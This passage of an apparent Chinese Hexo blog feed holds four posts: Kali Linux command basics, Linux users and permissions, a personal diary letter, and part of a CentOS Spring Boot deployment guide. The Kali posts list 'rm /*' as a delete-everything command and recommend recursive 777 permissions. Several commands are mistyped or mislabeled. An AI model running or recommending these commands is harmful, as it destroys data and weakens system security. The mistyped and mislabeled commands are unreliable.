class="line">dpkg-reconfigure locales --- 安装字体</span><br><span class="line">apt-get update &amp;&amp; apt-get <span class="keyword">dist</span>-upgrade -y --- 刷新系统更新源</span><br><span class="line"></span><br><span class="line">rm <span class="comment">/* 删除所有文件、文件目录</span></span><br></pre></td></tr></table></figure><hr><h4 id="Linux常用命令介绍"><a href="#Linux常用命令介绍" class="headerlink" title="Linux常用命令介绍"></a>Linux常用命令介绍</h4><ul><li><strong>帮助命令</strong>：在 Linux 环境中，如果遇到困难，可以使用帮助命令来取得帮助</li><li><strong>常用系统工作命令</strong>：Linux 中有一些是常用的系统工作命令</li><li><strong>系统状态检测命令</strong>：在 Linux 有一些可以查看 Linux 配置系统的基本命令</li><li><strong>工作目录切换命令</strong>：在 Linux中，工作目录指的是用户当前在系统中所处的位置</li><li><strong>文本文件编辑命令</strong></li><li><strong>文件目录管理命令</strong></li><li><strong>打包压缩与搜索命令</strong></li><li><strong>文件管理权限命令</strong>（Linux分为用户和组的感念）</li></ul><p><strong>在线命令查找：<a href="http://linux.51yip.com/">Linux命令参考</a></strong></p><figure class="highlight v"><table><tr><td class="code"><pre><span class="line">echon命令</span><br><span class="line">echon命令用于在终端输出字符串或变量提取后的值，格式为<span class="string">&quot;echo[字符串 | $变量] &quot;</span></span><br><span class="line"></span><br><span class="line">date命令</span><br><span class="line">date命令用于显示以及设置系统的时间或日期，格式为<span class="string">&quot;date [选项] [+指定的格式]&quot;</span></span><br><span class="line"></span><br><span class="line">poweroff命令</span><br><span class="line">poweroff命令用于关闭系统，其格式为poweroff</span><br><span class="line"></span><br><span class="line">top命令</span><br><span class="line">显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率等,格式为<span class="string">&quot;top [参数]&quot;</span></span><br><span class="line"></span><br><span class="line">ifconfig命令</span><br><span class="line">ifconfig命令用于获取网卡配置与网络状态等信息，格式为<span class="string">&quot;ifconfig [网络设备] [参数]&quot;</span></span><br><span class="line"></span><br><span class="line">uname命令</span><br><span class="line">uname命令用于查看系统内核与系统版本等信息，格式为<span class="string">&quot;uname [-a]&quot;</span></span><br><span class="line"></span><br><span class="line">who命令</span><br><span class="line">who命令用于查看当前登入主机的用户终端信息，格式为<span class="string">&quot;who [参数]&quot;</span></span><br><span class="line"></span><br><span class="line">history命令</span><br><span class="line">history命令用于显示历史执行过的命令，格式为<span class="string">&quot;history [-c]&quot;</span></span><br><span class="line"></span><br><span class="line">pwd命令</span><br><span class="line">pwd命令用于显示用户当前所处的工作目录，格式为<span class="string">&quot;pwd [选项]&quot;</span></span><br><span class="line"></span><br><span class="line">cd命令</span><br><span class="line">cd命令用于切换工作路径，格式为<span class="string">&quot;cd [目录名称]&quot;</span></span><br><span class="line"></span><br><span class="line">ls命令</span><br><span class="line">ls命令用于显示目录中的文件信息，格式位<span class="string">&quot;ls [选项] [文件]&quot;</span></span><br><span class="line"></span><br><span class="line">cat命令</span><br><span class="line">cat命令用于查看纯文本文件（内容较少的），格式为<span class="string">&quot;cat [选项] [文件]&quot;</span></span><br><span class="line"></span><br><span class="line">more命令</span><br><span class="line">more命令用于查看纯文本文件（内容较多的），格式为<span class="string">&quot;more [选项] [文件]&quot;</span></span><br><span class="line"></span><br><span class="line">head命令</span><br><span class="line">head命令用于查看纯文本文档的前N行，格式为<span class="string">&quot;head [选项] [文件]&quot;</span></span><br><span class="line"></span><br><span class="line">wc命令</span><br><span class="line">wc命令用于统计指定文本的行数、字数、字节数，格式为<span class="string">&quot;wc [参数] 文本&quot;</span></span><br><span class="line"></span><br><span class="line">stat命令</span><br><span class="line">stat命令用于查看文件的具体存储信息和时间等信息，格式为<span class="string">&quot;stat 文件名称&quot;</span></span><br><span class="line"></span><br><span class="line">touch命令</span><br><span class="line">touch命令用于创建空白文件或设置文件的时间信息，格式为<span class="string">&quot;touch [选项] [文件]&quot;</span></span><br><span class="line"></span><br><span class="line">mkdir命令</span><br><span class="line">mkdir命令用于创建空白的文件目录，格式为<span class="string">&quot;mkdir [选项] [目录名称]&quot;</span></span><br><span class="line"></span><br><span class="line">cp命令</span><br><span class="line">cp命令用于复制文件或文件目录，格式为<span class="string">&quot;cp [选项] [源文件] [目标文件]&quot;</span></span><br><span class="line"></span><br><span class="line">mv命令</span><br><span class="line">mv命令用于移动文件或将文件重命名，格式为<span class="string">&quot;mv [选项] [源文件] [目标路径|目标文件名]&quot;</span></span><br><span class="line"></span><br><span class="line">file命令</span><br><span class="line">file命令用于查看文件的类型，格式为<span class="string">&quot;file [文件名]&quot;</span></span><br><span class="line"></span><br><span class="line">tar命令</span><br><span class="line">tar命令用于对文件进行打包压缩或解压，格式为<span class="string">&quot;tar [选项] [文件]&quot;</span></span><br><span class="line"></span><br><span class="line">find命令</span><br><span class="line">find命令用于按照指定条件来查找文件，格式为<span class="string">&quot;find [查找路径] [寻找条件] [操作]&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h4 id="常用命令简洁解释"><a href="#常用命令简洁解释" class="headerlink" title="常用命令简洁解释"></a>常用命令简洁解释</h4><figure class="highlight v"><table><tr><td class="code"><pre><span class="line">cat --- 查看文本文件（内容少的）</span><br><span class="line">more --- 查看文本文件（内容多的）</span><br><span class="line">head --- 查看文本文档的前N行</span><br><span class="line">wc --- 统计指定文本的行数、字数、字节数</span><br><span class="line">stat --- 查看文本的存储、时间等信息</span><br><span class="line">echo --- 输出命令，它可以和map帮助命令一样使用帮助我们创建文件</span><br><span class="line">date --- 查看时间</span><br><span class="line">poweroff --- 关机</span><br><span class="line">top --- 和 Windos 任务管理器功能类似（防卡死、检测程序是否执行）</span><br><span class="line">ifconfig --- 查看网络信息</span><br><span class="line">uname --- 查看用户、系统信息</span><br><span class="line">who --- 查看终端、本地连接用户信息</span><br><span class="line">whoami --- 查看自己的用户信息</span><br><span class="line">history --- 查看用户指令历史（默认保存<span class="number">1000</span>条）可查看其他用户的操作</span><br><span class="line">lastb --- 查看目前与过去登入系统的用户相关信息</span><br><span class="line">pwd --- 查看当前目录</span><br><span class="line">cd --- 切换目录</span><br><span class="line">ls --- 查看目录下文件</span><br><span class="line">touch --- 创建空白文件或改变文件时间信息</span><br><span class="line">mkdir --- 创建空白文件目录</span><br><span class="line">cp --- 复制文件或文件目录</span><br><span class="line">mv --- 移动文件或重命名文件</span><br><span class="line">file --- 查看文件类型</span><br><span class="line">tar --- 对文件进行打包压缩或解压</span><br><span class="line">find --- 按照指定条件查找文件</span><br><span class="line">grep --- h</span><br><span class="line">chmod --- 权限管理</span><br><span class="line">wget --- 下载命令</span><br><span class="line">rm --- 删除</span><br><span class="line">rm <span class="comment">/* --- 所有东西</span></span><br></pre></td></tr></table></figure><hr><h4 id="文件管理权限命令"><a href="#文件管理权限命令" class="headerlink" title="文件管理权限命令"></a>文件管理权限命令</h4><p><code>使用 chmod 命令进行文件的权限修改</code></p><blockquote><p>chmod [选项] &lt; 模式, 模式… &gt; &lt;文件名&gt;</p></blockquote><p><strong>文件和目录的权限</strong></p><blockquote><p>Linux 中文件和目录的权限有所不同</p></blockquote><ul><li>文件权限</li></ul><figure class="highlight v"><table><tr><td class="code"><pre><span class="line">r --- 可以读文件  数值为<span class="number">4</span></span><br><span class="line">w --- 可以写文件  数值为<span class="number">2</span></span><br><span class="line">x --- 可以执行文件 数值为<span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>目录权限</li></ul><figure class="highlight v"><table><tr><td class="code"><pre><span class="line">x r --- 可以读取（cp）和查看（ls）目录的内容（即文件和目录），同时还需要可执行权限</span><br><span class="line">x w --- 可以在目录里创建文件（touch）和目录（mkdir）和删除文件（rm）和目录（rmdir），同时还需要可执行权限</span><br><span class="line">x x --- 可以进入目录（cd）和执行文件 实践过程</span><br></pre></td></tr></table></figure><hr><h4 id="Kali-Linux-系统更新源"><a href="#Kali-Linux-系统更新源" class="headerlink" title="Kali Linux 系统更新源"></a>Kali Linux 系统更新源</h4><figure class="highlight v"><table><tr><td class="code"><pre><span class="line"># 阿里源</span><br><span class="line">deb https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"> </span><br><span class="line"># 清华大学</span><br><span class="line">deb https:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"></span><br><span class="line"># 中科大</span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/kali kali main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.ustc.edu.cn/kali kali main non-free contrib</span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span></span><br></pre></td></tr></table></figure><hr><h3 id="什么是Shell"><a href="#什么是Shell" class="headerlink" title="什么是Shell"></a>什么是Shell</h3><p>在计算机科学中<strong>Shell</strong> 俗称外壳（用来区别于内核），它类似于Windows的DOS系统，能够接收用户的命令并翻译给操作系统执行，<strong>是用户与操作系统（内核）之间的桥梁</strong>。</p><h4 id="查看Shell"><a href="#查看Shell" class="headerlink" title="查看Shell"></a>查看Shell</h4><p>查看系统支持哪些 <strong>Shell（命令）</strong>：<code>eat /etc/shells</code><br>查看正在使用的<strong>Shell</strong>：<code>echo $SHELL</code></p><h5 id="Shell与终端的区别"><a href="#Shell与终端的区别" class="headerlink" title="Shell与终端的区别"></a>Shell与终端的区别</h5><ul><li><strong>终端</strong>：接收用户的输入，并传递给Shell程序，接收程序输出并展示到屏幕。</li><li><strong>Shell</strong>：接收并解析用户的指令给操作系统，将结果输出到终端。建议采用Zsh终端</li></ul><hr><h3 id="VM编辑器"><a href="#VM编辑器" class="headerlink" title="VM编辑器"></a>VM编辑器</h3><p><strong>VM编辑器是所有Unix及Linux系统下标准的编辑器，就相当于Windows系统中的记事本一样</strong>，它的强大不逊色与任何最新的文本编辑器。它是我们使用Linux系统不能缺少的工具。</p><ul><li><strong>vim具有程序编辑的能力，可以以字体颜色辨别语法的正确性，方便程序设计</strong>；</li><li><strong>vim可以当作vi的升级版本，它可以用多种颜色的方式来显示一些特殊的信息</strong>；</li><li><strong>vim会依据文件扩展名或者是文件内的头部信息，判断该文件的内容而自动的执行该程序的语法判断式，再以颜色来显示程序代码与一般信息</strong>；</li><li><strong>vim里面加入了很多额外的功能，例如支持正则表达式的搜索、多文件编辑、块复制等等。这对于我们在Liunx上进行一些配置文件的修改工作是很棒的功能</strong>；</li></ul><h4 id="VM编辑器的使用（代码介绍）"><a href="#VM编辑器的使用（代码介绍）" class="headerlink" title="VM编辑器的使用（代码介绍）"></a>VM编辑器的使用（代码介绍）</h4><p><strong>Vi / Vim 编辑器模式</strong>：</p><ul><li><strong>命令模式（默认</strong>：刚进入Vim的时候，默认就是命令模式，可以复制行、删除行等。</li><li><strong>输入模式</strong>：可以输入内容。</li></ul><p>**模式转化 **:<br>使用insert键切换进入输入模式：命令模式 –&gt; 输入模式：</p><blockquote><p>i ：在当前光标所在字符的前面，转为输入模式<br>I ：在当前光标所在行的行首，转化为输入模式<br>a ：在当前光标所在字符的后面，转化为输入模式<br>A ：在当前光标所在行尾，转化为输入模式<br>o ：在当前光标所在行的下方，新建一行，并转化为输入模式<br>O ：在当前光标所在行的上方，新建一行，并转化为输入模式<br>s ：删除光标所在字符<br>r ：替换光标处字符</p></blockquote><p>输入模式 –&gt; 命令模式</p><blockquote><p><strong>ESC键</strong></p></blockquote><p>关闭、保存文件</p><blockquote><p><strong>Shift+：号</strong>命令模式下：<br>w ：保存<br>q ：退出<br>wq 和 x 都是保存退出<br>q! ：强制退出<br>w! ：强制保存，管理员才有权限</p></blockquote><p>查找</p><blockquote><p><strong>普通模式：</strong><br>/PATTERN ：从当前位置向后查找<br>?PATTERN ：从当前位置向前查找</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali-Linux 用户组</title>
      <link href="/2021/09/15/kaliLinux_UserIntroduction/"/>
      <url>/2021/09/15/kaliLinux_UserIntroduction/</url>
      
        <content type="html"><![CDATA[<h2 id="kali-Linux-用户组"><a href="#kali-Linux-用户组" class="headerlink" title="kali-Linux 用户组"></a>kali-Linux 用户组</h2><p><code>Lali Linux 系列第二篇</code></p><h3 id="用户组介绍"><a href="#用户组介绍" class="headerlink" title="用户组介绍"></a>用户组介绍</h3><blockquote><p>在 Linux 中，每个文件都是属于一个用户的，而每个用户都属于一个用户组</p><p>在 Linux 中，可以同时拥有N多个用户，和用户组</p><p>在 Linux 中，用户分为三类：系统用户（Root用户）、普通用户（指用户所创建的用户）、虚拟用户（指软件所创建的虚拟用户）</p></blockquote><p><strong>用户信息解释</strong></p><blockquote><p>bai : x :1001 : 0 :: /home/bai:/bin/sh</p><p>bai：表示用户名</p><p>“:”：表示分割线</p><p>x：表示密码，我们看到是x，其实密码已经映射到 /etc/shadow 文件中，也就是为了保密</p><p>1001：表示用户UID</p><p>0：表示用户组</p><p>/home/bai：表示用户的目录</p><hr><p>“:”：为分隔符</p><p>第一个root为用户名</p><p>第二个x为密码</p><p>第三个0为UID</p><p>第四个0为GID</p><p>第五个root为用户全名</p><p>第六个/root为用户的家目录所在位置：beinan这个用户</p><p>第七/bin/bash为用户所用SHELL的类型</p></blockquote><p><code>还是不明白可以参考</code>：<a href="https://blog.51cto.com/983836259/1634705">说明文件</a></p><p><strong>用户组解释</strong></p><blockquote><p>root : x : 0 : root,key</p><p>“:”为分隔符</p><p>第一个 root 为组名</p><p>第二个 x 为密码，保存在 shadow文件</p><p>第三个 0 为组ID</p><p>第四个root为组成员</p><p>第五个Key代表第二个组成员</p></blockquote><p><code>还是不明白可以参考</code><a href="https://blog.csdn.net/fu18838928050/article/details/82454127">说明文件</a></p><p><strong>在 Linux 中查看用户信息使用下面的指令</strong></p><blockquote><p>cat /etc/passwd</p></blockquote><p><strong>在 Linux 中查看用户组信息使用下面的指令</strong></p><blockquote><p>cat /etc/group</p></blockquote><p><strong>查看指定的用户信息</strong></p><blockquote><p>id &lt;用户名称&gt;</p></blockquote><p><strong>查看指定的用户组信息</strong></p><blockquote><p>id &lt;组名&gt;</p></blockquote><h3 id="用户组的概念"><a href="#用户组的概念" class="headerlink" title="用户组的概念"></a>用户组的概念</h3><blockquote><p>文件拥有者：就是文件的创作者，谁创建的文件，谁就是文件的所有者</p></blockquote><blockquote><p>用户所在组：当 Linux 当前用户创建了一个文件后，则这个文件所属于的组便是这个用户所在的组</p></blockquote><blockquote><p>其他组：除了文件所有者以及所在组的用户外，系统其他的用户都是文件的其他组</p></blockquote><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><figure class="highlight v"><table><tr><td class="code"><pre><span class="line">useradd --help  --- 查看帮助命令</span><br><span class="line">cat /etc/passwd--- 查看用户信息</span><br><span class="line">useradd -m &lt;用户名&gt;  --- 自动在home文件夹下创建&lt;用户&gt;目录 - 添加用户</span><br><span class="line">useradd -g &lt;组名&gt; &lt;用户名&gt; --- 指定添加在某个组里</span><br><span class="line">passwod &lt;用户名&gt;  --- 修改用户的新密码</span><br><span class="line">userdel -r &lt;用户名&gt;  --- 删除目录以及用户</span><br><span class="line">groups &lt;用户名&gt;      --- 查看用户组归属</span><br><span class="line">usermod -g &lt;组名&gt; &lt;用户名&gt; --- 添加组 直接添加组用用户从原来组</span><br><span class="line">usermod -a-G &lt;组名&gt; &lt;用户名&gt; --- 追加到新的组</span><br><span class="line">groupdel &lt;组名&gt; 删除组</span><br></pre></td></tr></table></figure><h3 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h3><h4 id="权限划分"><a href="#权限划分" class="headerlink" title="权限划分"></a>权限划分</h4><blockquote><p>r 表示读文件 数值为4</p><p>w 表示写文件 数值为2</p><p>x 表示执行 数值为1</p></blockquote><h4 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h4><blockquote><p>当前目录下 ls -l</p></blockquote><figure class="highlight v"><table><tr><td class="code"><pre><span class="line">d rwx r-x r-x. <span class="number">2</span> root root <span class="number">36864</span> Aug <span class="number">9</span> <span class="number">19</span>:<span class="number">37</span> bin</span><br><span class="line">d rwx r-x r-x. <span class="number">2</span> root root <span class="number">4096</span>  Jun <span class="number">28</span> <span class="number">2011</span> eyc</span><br><span class="line">d rwx r-x r-x. <span class="number">2</span> root root <span class="number">4096</span>  Jun <span class="number">28</span> <span class="number">2011</span> games</span><br><span class="line">d rwx r-x r-x. <span class="number">3</span> root root <span class="number">4096</span>  Aug <span class="number">7</span> <span class="number">19</span>:<span class="number">00</span> <span class="keyword">include</span></span><br></pre></td></tr></table></figure><blockquote><p>d 表示文件类型：</p><ul><li>“-“ 普通文件</li><li>d   目录文件</li><li>p   管理文件</li><li>l    链接文件</li><li>b   块设备文件</li><li>c   字符设备文件</li><li>s   套接字文件   </li></ul></blockquote><blockquote><p>rwx r-x r-x. 表示文件权限：r 读权限 w 写权限 x 可执行权限 - 无权限</p><p>rwx 表示所有者 / 所有者权限</p><p>r-x 组用户权限（一个组中除所有者拥有的权限）</p><p>r-x. 其他用户权限（除过当前有所有者的组，其他组可以进行访问的权限）</p><p>[数值] 对于普通文件：链接数，对于目录文件：第一级子目录数</p><p>root 第一个为用户名</p><p>root 第二个为组名</p><p>[数值] 文件大小（单位：字节）</p><p>Aug 9 19:37 最后修改时间信息</p><p>bin 文件名</p></blockquote><h4 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h4><blockquote><p>chmod 命令</p><p>chmod 777 文件名    给当前文件设置为777权限（可随意操作权限）</p><p>chmod -R 777 目录名    给当前目录递归权限为777</p></blockquote><p><strong>权限演示游戏</strong>：<a href="https://linxz.github.io/tianyizone/linux-chmod-permissions.html">游戏</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【無憂樹洞】致未来的你，情书</title>
      <link href="/2021/09/15/epistle.2021.9.15.01/"/>
      <url>/2021/09/15/epistle.2021.9.15.01/</url>
      
        <content type="html"><![CDATA[<p>我说，我想感觉你，我刷新这个页面，就有一条新消息。然后我刷新了，就真的有了一条新消息。</p><p>昨儿被闺蜜拉着出去逛公园，赤脚踩在草地上，感受太阳的温度，大地的温度，接一接地气，吸收下大自然的能量。感觉就好像跟你在约会。被你拉出去约会，哈哈。</p><p>我真的是那种，自己没什么想法，不太会主动去做些什么，但是无论把我扔到什么环境，什么事情里面，我都会享受其中的。我一直在想，我要如何可以让自己有能量去行动。</p><p>昨儿去我妈家里，我妈跟我爸，就是没说几句话，就会吵吵嚷嚷的，好像这是他们一种相处的模式，你说，人老了之后，就是找个伴儿吗?哪怕是相互嫌弃相互争吵，而如果真的对方不在了，是不是也会不习惯？我不知道。没有什么人让我特别依赖和依恋，我也没有那样习惯到不习惯的感觉。我前夫离开我的很大的一个原因，可能就是他感觉不到我需要他吧。虽然我明明很热烈，也很渴望炙热的甚至黏腻的感情，哈哈。。。因为不是你吧。。哈哈。。但是我想，如果再和什么人有什么亲密的关系，我一定不希望彼此是争吵的，我是个吵不起来的人，因为不喜欢争执，也不希望彼此是不了解的，没有什么比可以说话更重要。嗯，我就是这样想的。甚至，如果我可以这样和你自言自语，是不是也不需要什么人来说话了。。。毕竟，找个可以说话的人也是很麻烦的事情。哈哈。</p><p>我妈早上来我家搞卫生，我就骑车车出门了，我总觉得，她打扫的时候，我不在是更方便和合适的，他们都有家里的钥匙，进门都自己开，我也时常觉得，这只是一个住的地方。家应该是什么样子？又是什么感觉呢？儿子长大了，开始霸占我的房间，这是一个一居室的老房子，客厅还算比较大，之前特地给他做了高低铺，上面可以睡觉，下面有写字台，最近还给他装了帘子，让他可以有自己的空间，但是他还是喜欢在房间里。我就给他买了小桌子，起码不用趴在床上去写作业。可是我不喜欢，房间里充斥着他的味道（孩子长大了，就有人味了，哈哈。。。），我也不喜欢，房间里，有很多怎么都收拾不干净的东西，写完作业也不会当天晚上把书包就收了，然后地上，就是各种书，衣服。他喜欢玩游戏，玩着玩着就会不自觉得大声说话，我也不喜欢。他还不喜欢洗澡，不会每天都洗澡。</p><p>每个人都是不一样的，就算是我的儿子，我们还有那么多不同的喜好，不同的习惯。我只是不喜欢，这是我们的不同。我也不会要求他必须如何。该说的说了，他也不会改变。而我时常反思，为什么我们总是要要求孩子改变，为什么我们总是要说这是好的习惯，那是不好的习惯，而除了要求孩子，我们还有什么方式可以去让他养成我们自认为好的习惯呢？我对于教育孩子甚至没有兴趣。我觉得孩子该是什么样子就是什么，我对此没有什么焦虑。该踩的坑，该走的路，始终都是要自己去亲历的。很多人接受不了我对孩子这种姿态。我的闺蜜，我的前夫，也总是会劝说和不断的希望影响我。我们都不喜欢被指责，被教导，甚至被要求。而我也时常觉得，我还是得把自己过好了，这是唯一的中心。我把自己过好了，周围的一切自然会有该有的变化。</p><p>所以，关系是很累的。无论怎样的关系，总是伴随着控制和被控制，要求和被要求。讨好迎合。期待或失望。我们都没有长大。所以也给不了什么成熟的关系，和成熟的姿态。可是如果有人愿意，这样一起慢慢的共同的长大，是不是也挺好。你说，我是该死心呢，绝望呢，还是。。。哈哈。。。这真是一个不用动脑子的问题，该发生的自然会发生，该遇见的自然会遇见，这种事情，用力都没用。该有的业力，怎么都逃不掉。没有的缘分，怎么都争取不到。可是不管怎样，我都还是要努力去做自己的功课。我还是要去解决没有什么行动力的问题。</p><p>我早上出门，就想着吃吃吃，不吃不吃，然后我就特别难受。有时候我觉得我对身体也是很陌生的，祂不吃也不饿，吃也不饱。可以吃很少，也可以一直吃，也不会饱。可是祂还是物理存在的。我还是要调整这个物理存在。转了一圈，我什么也没吃，回家了，然后哭了一会。哈。。。我想找人说说话的，也觉得没什么人是可以麻烦的。看，我们活的多乖，多懂事，以及，多孤独。孤独是人的一种属性。那个时候，我想，也许，我们真的是可以一个人走下去的，也不需要多余的人，因为其实没有人会明白和了解另外一个人。没有什么感同身受。甚至我自己也不明白。我不知道什么时候就会有情绪，甚至被情绪控制，那些情绪或者念头好像也跟我没什么关系。有时候走在大街上，也觉得很陌生，仿佛我就不属于这里。我也不知道什么时候，身体的某个部位就开始不舒服。我也不知道什么时候就觉得特别无力，什么都不想做。我上午没有吃什么，回来吃了一个苹果。然后被闺蜜拉出去逛街。看中一个蜡烛的香薰，蜡烛是很好的仪式用品，带着连接的能量。那个味道也很好，是我喜欢的，有安息香的成分。我想这也许也是你给的一种指引。和闺蜜在一起的时候，吃了甜品，提拉米苏的千层，我喜欢提拉米苏，是因为之前有人说，提拉米苏代表带我走，在内心很深的地方，我们总是渴望依靠什么人，总是渴望被抱持。尽管我们也真的要从这样的无依无靠的绝望中，生长出自己的力量。跟闺蜜分开之后，就又一个人去吃吃吃了，我安顿不好情绪，就只能用吃吃吃来安顿。索性，吃完，情绪就安分了。然后又可以好好想想，到底要怎样。</p><p>我坐在店铺靠窗的位置，二楼。看着十字路口，人来人往，车来车往，发呆。一度，我觉得特别痛苦。这条路，走到这个时候，再走下去，还是更深的深渊和黑暗，而且没有人可以同行。你在吗？哈哈。有时候我可以感觉到你，可是我自己很糟糕的时候，我什么也感觉不到。可是除了搞清楚这一切，除了继续走下去，我更没有什么其他有兴趣的事了。走着走着，就把自己活成了一个异类。我不在意，我很享受跟别人不一样。我只是还没有足够的能量，去更快的转变。我也不知道我在等什么。可能还是要持续的去做一些事，不能由着自己，训练只要机械化的执行就可以，而积累到一定程度，自然会发生变化。而想要什么的念头，是不是也需要不断的去强化呢。</p><p>晚上看到笑笑发的广告，关于扁平水晶的，一眼就看中了，很有感觉，就入手了两个。我想这也是你给的启示吧。</p><p>这是一场没有终止的游戏，过了一关，能力提升了一些，就会解锁新的关卡。而对于不断的挑战，不断的解锁新关卡，升起这样的兴趣也需要能量。我知道，只是在这个过程中，只是现在这种不上不下的阶段，会比较痛苦。</p><p>我不想说了，你有什么想要跟我说的。</p><p>给我打气呀，我知道你会说，你看见我很努力，尽管我口口声声觉得我真的没有什么兴趣，也没有什么欲望，但是我也真的从来没有放弃过去让自己生长进化，去提升自己。少想一点，多做一点。可是我也无法掌控我的念头。好吧，无法控制的时候，我就少做一点，但是我得去做，是不是。不能不做。稳定的时候多做一些，不稳定的时候少做一些，但是我不能停下来不做，我得每天做，哪怕做一点点，每日精进，就会趋于更多的稳定，改变也会发生。好吧，我收到了。我记住了。做。稳定就多做点，不稳定也要做。不要不做。那么升级就只剩下时间的问题，迟早会发生。</p><hr><p><strong>我只是在呢喃自语，</strong></p><p><strong>如果你看了，就已经是一种见证和陪伴了，</strong></p><p><strong>因为我知道一定会有人看。</strong></p><p><strong>如果有什么信息能和你共鸣，</strong></p><p><strong>你从中看见了自己，</strong></p><p><strong>那就是另外的收获了。</strong></p><p><strong>如果你看懂了，</strong></p><p><strong>你从中看见了我，</strong></p><p><strong>还能有什么回应，</strong></p><p><strong>并且这回应我们还可以彼此共振，</strong></p><p><strong>那就是更大的惊喜了。</strong></p><p><strong>没有无缘无故的遇见。</strong></p><p><strong>致敬未知。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 书信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小柔书信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cent OS 8.0服务器部署Spring Boot</title>
      <link href="/2021/09/11/Cent%20OS%208.0%20_%20Deployment%20server/"/>
      <url>/2021/09/11/Cent%20OS%208.0%20_%20Deployment%20server/</url>
      
        <content type="html"><![CDATA[<h2 id="Cent-OS-8-0服务器部署Spring-Boot"><a href="#Cent-OS-8-0服务器部署Spring-Boot" class="headerlink" title="Cent OS 8.0服务器部署Spring Boot"></a>Cent OS 8.0服务器部署Spring Boot</h2><hr><h3 id="前期准备说明："><a href="#前期准备说明：" class="headerlink" title="前期准备说明："></a>前期准备说明：</h3><ul><li>服务器镜像选择CentOs8.0系统镜像(新手建议选择轻量级应用服务器（主机），个人推荐云服务器)</li><li>需要准备好域名</li><li>需要准备好Spring Boot的项目</li><li>准备好JDK安装包(linux系统X64 Bit)</li><li>我们需要准备两个软件用于本地连接服务器<ul><li>Xshell 7 这个软件用于远程管理服务器（你需要设置好服务器密钥）</li><li>Xftp 7 这个软件用于上传下载服务器文件</li></ul></li><li>我们需要开放需要的端口<ul><li>80 服务器的默认网页端口（建议不要采用默认的）</li><li>8080 自定义TCP协议端口</li><li>22 SSH远程连接端口</li><li>3306 Mysql默认端口等</li></ul></li></ul><hr><h3 id="服务器前期配置："><a href="#服务器前期配置：" class="headerlink" title="服务器前期配置："></a>服务器前期配置：</h3><blockquote><p>我们需要在Data文件夹下新建三个文件夹</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># tmp文件夹我们用于存放临时文件，如安装包等</span><br><span class="line">mkdir -p /data/tmp</span><br><span class="line"># service文件夹我们用于存放服务器软件文件</span><br><span class="line">mkdir -p /data/service</span><br><span class="line"># file文件夹为存放项目的文件夹，根据项目名称命名</span><br><span class="line">mkdir -p /data/file</span><br></pre></td></tr></table></figure><blockquote><p>从oracle官方网站上下载1.8版本中的最新版的JDK。下载完成后，把文件通过XFTP上传到服务器上（tmp文件夹）。接着进行解压和配置环境变量。<br>然后我们需要在服务器中解压（通过Xshell 7连接服务器）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#进入安装包目录</span><br><span class="line">cd /data/tmp</span><br><span class="line">#解压</span><br><span class="line">tar -zxvf jdk-8u281-linux-x64.tar.gz</span><br><span class="line">#把解压出来的文件夹转移到service文件夹的地方</span><br><span class="line">mv /data/tmp/jdk1.8.0_281 /data/service/jdk1.8.0_28</span><br></pre></td></tr></table></figure><blockquote><p>下来我们要进行JDK环境变量的配置(etc文件夹下profile文件)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 修改环境变量/etc/profile</span><br><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure><blockquote><p>通过i键进入编写模式，完成后按ESC文件退出编写模式，输入(:wq)保存并退出（配置内容如下）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=/data/service/jdk1.8.0_281</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br></pre></td></tr></table></figure><blockquote><p> 最后我们测试JDK</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使环境变量生效</span><br><span class="line">source /etc/profile</span><br><span class="line">#检查是否配置成功</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure><h3 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a>MySQL安装</h3><blockquote><p>如果之前安装过Mysql，那么我们需要清理干净之前的MySQL文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#卸载旧版本</span><br><span class="line">sudo yum remove docker \</span><br><span class="line">                docker-client \</span><br><span class="line">                docker-client-latest \</span><br><span class="line">                docker-common \</span><br><span class="line">                docker-latest \</span><br><span class="line">                docker-latest-logrotate \</span><br><span class="line">              docker-logrotate \</span><br><span class="line">                docker-engine</span><br></pre></td></tr></table></figure><blockquote><p>我们采用docker的方式安装mysql</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 